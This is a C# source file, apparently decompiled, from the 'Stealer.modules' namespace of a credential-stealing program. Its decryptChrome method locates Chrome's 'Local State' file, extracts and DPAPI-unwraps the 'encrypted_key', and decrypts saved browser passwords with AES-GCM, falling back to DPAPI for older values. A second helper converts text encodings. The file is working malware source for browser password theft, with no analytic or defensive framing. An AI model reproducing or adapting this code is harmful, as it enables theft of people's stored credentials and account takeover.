using System;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;

namespace Stealer.modules
{
	// Token: 0x02000017 RID: 23
	internal class Crypt
	{
		// Token: 0x06000080 RID: 128 RVA: 0x00006CC0 File Offset: 0x00004EC0
		public static string decryptChrome(string password, string browser = "")
		{
			if (password.StartsWith("v10") || password.StartsWith("v11"))
			{
				string path = "";
				string[] array = new string[]
				{
					"",
					"\\..",
					"\\..\\.."
				};
				foreach (string str in array)
				{
					path = Path.GetDirectoryName(browser) + str + "\\Local State";
					if (File.Exists(path))
					{
						break;
					}
					path = null;
				}
				string text = File.ReadAllText(path);
				string[] array3 = Regex.Split(text, "\"");
				int num = 0;
				foreach (string a in array3)
				{
					if (a == "encrypted_key")
					{
						text = array3[num + 2];
						break;
					}
					num++;
				}
				byte[] key = DecryptAPI.DecryptBrowsers(Encoding.Default.GetBytes(Encoding.Default.GetString(Convert.FromBase64String(text)).Remove(0, 5)), null);
				try
				{
					string s = password.Substring(3, 12);
					string s2 = password.Substring(15);
					byte[] bytes = Encoding.Default.GetBytes(s);
					return AesGcm256.Decrypt(Encoding.Default.GetBytes(s2), key, bytes);
				}
				catch
				{
					return "failed (AES-GCM)";
				}
			}
			string result;
			try
			{
				result = Encoding.Default.GetString(DecryptAPI.DecryptBrowsers(Encoding.Default.GetBytes(password), null));
			}
			catch
			{
				result = "failed (DPAPI)";
			}
			return result;
		}

		// Token: 0x06000081 RID: 129 RVA: 0x00006E58 File Offset: 0x00005058
		public static string toUTF8(string text)
		{
			Encoding encoding = Encoding.GetEncoding("UTF-8");
			Encoding encoding2 = Encoding.GetEncoding("Windows-1251");
			byte[] bytes = encoding2.GetBytes(text);
			byte[] bytes2 = Encoding.Convert(encoding, encoding2, bytes);
			return encoding2.GetString(bytes2);
		}
	}
}
